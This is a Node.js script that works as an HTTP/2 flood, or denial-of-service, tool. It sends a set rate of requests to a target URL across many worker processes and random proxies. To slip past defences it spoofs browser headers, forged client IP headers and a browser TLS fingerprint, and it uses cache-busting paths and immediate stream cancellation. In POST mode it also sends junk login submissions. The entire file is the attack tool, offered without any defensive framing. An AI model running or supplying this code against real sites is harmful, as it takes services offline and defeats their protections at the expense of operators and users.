const fs = require('fs');
const cluster = require('cluster');
const http2 = require('http2-wrapper');
const tls = require('tls');
const url = require('url');
const ja3 = require('ja3-fingerprint');
const { HttpsProxyAgent } = require('http2-wrapper');
const { parse } = require('set-cookie-parser');
const crypto = require('crypto');

const target = process.argv[2];
const duration = parseInt(process.argv[3]);
const rate = parseInt(process.argv[4]);
const threads = parseInt(process.argv[5]);
const proxyFile = process.argv[6];
const method = process.argv[7] || "GET";

const proxies = fs.readFileSync(proxyFile, 'utf-8')
    .split('\n')
    .filter(Boolean);

const headersList = [
    {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36",
        "referer": "https://google.com",
        "x-forwarded-proto": "https",
        "x-real-ip": randomIP()
    },
    {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp",
        "accept-language": "en-US,en;q=0.8",
        "user-agent": "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 Chrome/125.0.0.0 Mobile Safari/537.36",
        "referer": "https://bing.com",
        "x-real-ip": randomIP()
    }
];

const h2Settings = {
    headerTableSize: 65536,
    maxConcurrentStreams: 1000,
    initialWindowSize: 6291456,
    maxHeaderListSize: 262144,
};

function randomIP() {
    return `${rand(1, 255)}.${rand(1, 255)}.${rand(1, 255)}.${rand(1, 255)}`;
}
function rand(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

if (cluster.isPrimary) {
    for (let i = 0; i < threads; i++) cluster.fork();
    setTimeout(() => {
        process.exit(1);
    }, duration * 1000);
} else {
    const parsedUrl = url.parse(target);

    setInterval(() => {
        for (let i = 0; i < rate; i++) {
            const proxy = proxies[Math.floor(Math.random() * proxies.length)];
            const [proxyHost, proxyPort] = proxy.split(":");
            const clientHeaders = headersList[Math.floor(Math.random() * headersList.length)];

            const client = http2.connect(target, {
                proxy: {
                    uri: `http://${proxyHost}:${proxyPort}`,
                },
                settings: h2Settings,
                maxConcurrentStreams: 1000,
                maxHeaderListSize: 262144,
                socketOptions: {
                    ALPNProtocols: ['h2'],
                    servername: parsedUrl.hostname,
                    rejectUnauthorized: false
                },
                ja3: {
                    version: 771,
                    cipherSuites: [
                        4865, 4866, 4867, 49195, 49196, 49199
                    ],
                    extensions: [0, 11, 10, 13172, 16, 5, 13],
                    ellipticCurves: [23, 24, 25],
                    ellipticCurvePointFormats: [0]
                }
            });

            client.on('connect', () => {
                const path = parsedUrl.path + `?cache=${Math.random().toString(36).substring(7)}`;
                const headers = {
                    ":method": method,
                    ":path": path,
                    ":scheme": "https",
                    ":authority": parsedUrl.hostname,
                    ...clientHeaders
                };

                const req = client.request(headers);

                if (method === "POST") {
                    const postData = `username=${crypto.randomBytes(4).toString('hex')}&password=${crypto.randomBytes(6).toString('hex')}`;
                    req.write(postData);
                }

                req.on('response', () => {
                    // RST_STREAM after response (like real browser closing tab)
                    req.close(http2.constants.NGHTTP2_CANCEL);
                    client.close();
                });

                req.setTimeout(3000, () => {
                    req.close(http2.constants.NGHTTP2_CANCEL);
                    client.close();
                });

                req.end();
            });

            client.on('error', () => {
                client.destroy();
            });
        }
    }, 1000);
}
